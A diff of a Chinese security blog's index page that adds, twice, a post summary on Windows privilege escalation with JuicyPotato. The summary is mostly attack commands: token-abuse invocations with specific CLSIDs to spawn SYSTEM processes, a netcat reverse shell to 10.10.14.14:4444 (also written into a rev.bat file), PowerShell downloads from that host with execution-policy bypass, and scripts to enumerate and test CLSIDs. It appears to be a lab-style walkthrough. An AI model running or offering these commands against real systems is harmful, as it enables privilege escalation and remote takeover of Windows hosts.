@@ -118,6 +118,82 @@
 <!--  <div class="project-card">
   
   <div class="ctnWrap">
+    <a href="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/" class="title">JuicyPotato提权</a>
+    <section class="desc">
+  项目地址：https://github.com/ohpe/juicy-potato/
+0x01、前言Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广
+利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用
+whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken
+
+
+0x02、JuicyPotato功能自主选择CLSID
+-c ‘clsid’         #### clsid查找：http://ohpe.it/juicy-potato/CLSID/ 
+自定义COM监听端口
+-l : COM server listen port
+COM监听地址
+-m : COM server listen address (default 127.0.0.1)
+进程创建模块 
+-t createprocess call:  CreateProcessWithTokenW,  CreateProcessAsUser, &lt;*&gt; try both
+执行指定进程或脚本
+-p : program to launch
+为指定的执行进程选择参数
+-a : command line argument to pass to program (default NULL)
+RPC服务地址
+-k : RPC server ip address (default 127.0.0.1)
+RPC服务端口：
+-n : RPC server listen port (default 135)
+支持测试模块；测试并查找clsid
+-z only test CLSID and print token’s user
+0x03、JuicyPotato使用依赖于clsid：PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+COM -&gt; recv failed with error: 10038查找替换http://ohpe.it/juicy-potato/CLSID/  很幸运2012 Standard中的第一条就成功了：
+./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;
+
+反弹shell：./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;或者将paylaod写入bat，-p参数执行bat
+echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat
+./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;RDP下提权：直接弹出一个system权限窗口
+./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;0x04、CLSID快速验证[1]获取可用CLSID列表
+提取CLSID Powershell脚本 GetCLSID.ps1
+同级目录下需要有Join-Object.ps1
+GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)
+Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1
+Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1
+powershell -ep bypass -f GetCLSID.ps1
+##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -枚举所有满足条件的CLSID:
+New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
+$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}
+foreach($a in $CLSID)
+{
+Write-Host $a.CLSID
+}[2]批处理调用juicypotato.exe逐个测试CLSID
+test_clsid.bat:
+@echo off
+:: Starting port, you can change it
+set /a port=10000
+SETLOCAL ENABLEDELAYEDEXPANSION
+FOR /F %%i IN (CLSID.list) DO (
+   echo %%i !port!
+   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log
+   set RET=!ERRORLEVEL!
+   :: echo !RET!
+   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1
+)0x05、限制条件
+需要支持SeImpersonate或者SeAssignPrimaryToken权限
+开启DCOM
+本地支持RPC或者远程服务器支持PRC并能成功登录
+能够找到可用的COM对象
+
+https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/
+
+
+</section>
+    <p class="sub">Apr 22, 2020</p>
+  </div>
+</div>-->
+<!---->
+<!--  <div class="project-card">
+  
+  <div class="ctnWrap">
     <a href="/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/" class="title">一次注入实战引发的SQLMAP修改之路</a>
     <section class="desc">
   首发于先知社区：https://xz.aliyun.com/t/6864
@@ -582,6 +658,97 @@ select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from 
     <div class="box-content flex1">
         <div class="swiper-container">
             <div class="swiper-wrapper">
+                
+                    <a title="JuicyPotato提权" alt="JuicyPotato提权" href="/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/"
+                       class="post-item swiper-slide flex flex-v">
+                        <div class="image">
+                            
+                                <img title="JuicyPotato提权" alt="JuicyPotato提权"
+                                     src="/images/default.jpg"></img>
+                            
+                        </div>
+                        <div class="content-warp flex1 flex flex-v">
+                            <div class="title">&lt; JuicyPotato提权 &gt;</div>
+                            <div class="content flex1">
+                                
+  项目地址：https://github.com/ohpe/juicy-potato/
+0x01、前言Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广
+利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用
+whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken
+
+
+0x02、JuicyPotato功能自主选择CLSID
+-c ‘clsid’         #### clsid查找：http://ohpe.it/juicy-potato/CLSID/ 
+自定义COM监听端口
+-l : COM server listen port
+COM监听地址
+-m : COM server listen address (default 127.0.0.1)
+进程创建模块 
+-t createprocess call:  CreateProcessWithTokenW,  CreateProcessAsUser, &lt;*&gt; try both
+执行指定进程或脚本
+-p : program to launch
+为指定的执行进程选择参数
+-a : command line argument to pass to program (default NULL)
+RPC服务地址
+-k : RPC server ip address (default 127.0.0.1)
+RPC服务端口：
+-n : RPC server listen port (default 135)
+支持测试模块；测试并查找clsid
+-z only test CLSID and print token’s user
+0x03、JuicyPotato使用依赖于clsid：PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+COM -&gt; recv failed with error: 10038查找替换http://ohpe.it/juicy-potato/CLSID/  很幸运2012 Standard中的第一条就成功了：
+./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;
+
+反弹shell：./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;或者将paylaod写入bat，-p参数执行bat
+echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat
+./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;RDP下提权：直接弹出一个system权限窗口
+./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe  -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;0x04、CLSID快速验证[1]获取可用CLSID列表
+提取CLSID Powershell脚本 GetCLSID.ps1
+同级目录下需要有Join-Object.ps1
+GetCLSID.ps1执行成功后生成文件CLSID.list和CLSID.csv(在windows对应版本的目录下，如Windows_Server_2012_R2_Datacenter)
+Invoke-WebRequest -Uri http://10.10.14.14:8000/Join-Object.ps1 -outfile ./Join-Object.ps1
+Invoke-WebRequest -Uri http://10.10.14.14:8000/GetCLSID.ps1 -outfile ./GetCLSID.ps1
+powershell -ep bypass -f GetCLSID.ps1
+##Get-Content GetCLSID.ps1 | PowerShell.exe -noprofile -枚举所有满足条件的CLSID:
+New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null
+$CLSID = Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N=&apos;CLSID&apos;; E={$_.pschildname}} | where-object {$_.appid -ne $null}
+foreach($a in $CLSID)
+{
+Write-Host $a.CLSID
+}[2]批处理调用juicypotato.exe逐个测试CLSID
+test_clsid.bat:
+@echo off
+:: Starting port, you can change it
+set /a port=10000
+SETLOCAL ENABLEDELAYEDEXPANSION
+FOR /F %%i IN (CLSID.list) DO (
+   echo %%i !port!
+   juicypotato.exe -z -l !port! -c %%i &gt;&gt; result.log
+   set RET=!ERRORLEVEL!
+   :: echo !RET!
+   if &quot;!RET!&quot; == &quot;1&quot;  set /a port=port+1
+)0x05、限制条件
+需要支持SeImpersonate或者SeAssignPrimaryToken权限
+开启DCOM
+本地支持RPC或者远程服务器支持PRC并能成功登录
+能够找到可用的COM对象
+
+https://3gstudent.github.io/3gstudent.github.io/Windows%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7Juicy-Potato%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90/
+
+
+
+                            </div>
+                            <div class="post-tags">
+                                
+                            </div>
+                            <div class="other">
+                                <!--<a><i class="iconfont icon-iconfontordinaryliulan"></i>52</a>-->
+                                <!--<a><i class="iconfont icon-icon27"></i>52</a>-->
+                                <span><i class="iconfont icon-shijian"></i>Apr 22, 2020</span>
+                            </div>
+                        </div>
+                    </a>
                 
                     <a title="一次注入实战引发的SQLMAP修改之路" alt="一次注入实战引发的SQLMAP修改之路" href="/2020/04/19/%E4%B8%80%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98%E5%BC%95%E5%8F%91%E7%9A%84SQLMAP%E4%BF%AE%E6%94%B9%E4%B9%8B%E8%B7%AF/"
                        class="post-item swiper-slide flex flex-v">
